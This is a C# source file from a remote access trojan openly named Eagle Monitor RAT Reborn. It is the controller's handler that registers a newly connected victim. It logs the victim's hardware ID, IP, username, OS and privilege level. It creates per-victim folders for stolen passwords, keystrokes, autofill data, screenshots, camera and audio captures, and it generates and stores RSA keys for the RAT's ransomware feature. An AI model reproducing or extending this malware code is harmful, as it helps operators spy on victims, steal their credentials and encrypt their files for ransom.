using PacketLib.Packet;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Media;
using Eagle_Monitor_RAT_Reborn.Network;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Threading.Tasks;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.PacketHandler
{
    internal class ConnectedPacketHandler
    {
        public ConnectedPacketHandler(ConnectedPacket connectedPacket, ClientHandler clientHandler)
        {
            clientHandler.HWID = connectedPacket.HWID;
            connectedPacket.baseIp = clientHandler.IP;

            clientHandler.clientPath = Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
            clientHandler.fullName = connectedPacket.Username + "@" + connectedPacket.HWID;

            Task.Run(() =>
            {
                if (!Directory.Exists(Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID))
                {
                    Directory.CreateDirectory(Misc.Utils.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID);
                    clientHandler.clientStatus = "New client connected !";

                    Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\History\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Autofill\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Keystrokes\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Keywords\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Audio Records\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Screenshots\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Camera\\");
                    Directory.CreateDirectory(clientHandler.clientPath + "\\Ransomware\\");

                    if (Program.settings.autoGenerateRSAKey)
                    {
                        Misc.EncryptionInformation encryptionInformation = new Misc.EncryptionInformation();
                        Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
                        encryptionInformation.publicRSAServerKey = rsaKey["PublicKey"];
                        encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];

                        string rsa = JsonConvert.SerializeObject(encryptionInformation);
                        File.WriteAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json", rsa);
                        clientHandler.encryptionInformation = encryptionInformation;
                    }

                }
                else
                {
                    clientHandler.clientStatus = "Old client connected !";
                    if (!File.Exists(clientHandler.clientPath + "\\Ransomware\\encryption.json") && Program.settings.autoGenerateRSAKey)
                    {
                        Misc.EncryptionInformation encryptionInformation = new Misc.EncryptionInformation();
                        Dictionary<string, string> rsaKey = Misc.Encryption.GetKey();
                        encryptionInformation.publicRSAServerKey = rsaKey["PublicKey"];
                        encryptionInformation.privateRSAServerKey = rsaKey["PrivateKey"];

                        string rsa = JsonConvert.SerializeObject(encryptionInformation);
                        File.WriteAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json", rsa);
                        clientHandler.encryptionInformation = encryptionInformation;
                    }
                    else
                    {
                        if (Program.settings.autoGenerateRSAKey)
                        {
                            Misc.EncryptionInformation encryptionInformation = JsonConvert.DeserializeObject<Misc.EncryptionInformation>(File.ReadAllText(clientHandler.clientPath + "\\Ransomware\\encryption.json"));
                            clientHandler.encryptionInformation = encryptionInformation;
                        }
                    }
                }
            });

            lock (Program.mainForm.clientDataGridView)
            {
                Program.mainForm.clientDataGridView.BeginInvoke((MethodInvoker)(() =>
                {
                    int rowId = Program.mainForm.clientDataGridView.Rows.Add();

                    DataGridViewRow row = Program.mainForm.clientDataGridView.Rows[rowId];

                    if (File.Exists(Misc.Utils.GPath + $"\\Flags\\{Program.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
                        row.Cells["Column1"].Value = Misc.Utils.ResizeImage(Image.FromFile(Misc.Utils.GPath + $"\\Flags\\{Program.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
                    else
                        row.Cells["Column1"].Value = Misc.Utils.ResizeImage(Image.FromFile(Misc.Utils.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));

                    row.Cells["Column2"].Value = connectedPacket.HWID;
                    row.Cells["Column3"].Value = clientHandler.IP;
                    row.Cells["Column4"].Value = connectedPacket.OSName;
                    row.Cells["Column5"].Value = connectedPacket.Username;
                    row.Cells["Column6"].Value = connectedPacket.RAM;
                    row.Cells["Column7"].Value = connectedPacket.RegionName;
                    row.Cells["Column8"].Value = connectedPacket.Privilege;
                    row.Cells["Column9"].Value = connectedPacket.Is64Bit;

                    if (connectedPacket.Is64Bit == "32")
                    {
                        clientHandler.is64bitClient = false;
                    }
                    else
                    {
                        clientHandler.is64bitClient = true;
                    }

                    if (connectedPacket.Privilege == "User")
                    {
                        clientHandler.isAdmin = false;
                    }
                    else
                    {
                        clientHandler.isAdmin = true;
                    }

                    row.Cells["Column10"].Value = clientHandler.serverPort.ToString();
                    clientHandler.clientRow = row;
                    Program.mainForm.clientDataGridView.ClearSelection();

                }));
            }

            Task.Run(() => 
            {
                if (Program.settings.notificationSound)
                {
                    using (MemoryStream ms = new MemoryStream(Misc.Utils.NotificationSound))
                    {
                        SoundPlayer player = new SoundPlayer(ms);
                        player.Play();
                    }
                }

                if (Program.settings.notificationIcon)
                {
                    NotifyIcon notifyIconClient = new NotifyIcon();
                    notifyIconClient.Visible = true;
                    notifyIconClient.Text = $"EM-RAT Reborn V{Misc.Utils.CoreAssembly.Version}";
                    notifyIconClient.Icon = Properties.Resources.eagle21;
                    notifyIconClient.BalloonTipText = $"New client connected !";
                    notifyIconClient.BalloonTipTitle = $"EM-RAT Reborn V{Misc.Utils.CoreAssembly.Version}";
                    notifyIconClient.ShowBalloonTip(30);
                }
            });
            return;
        }
    }
}
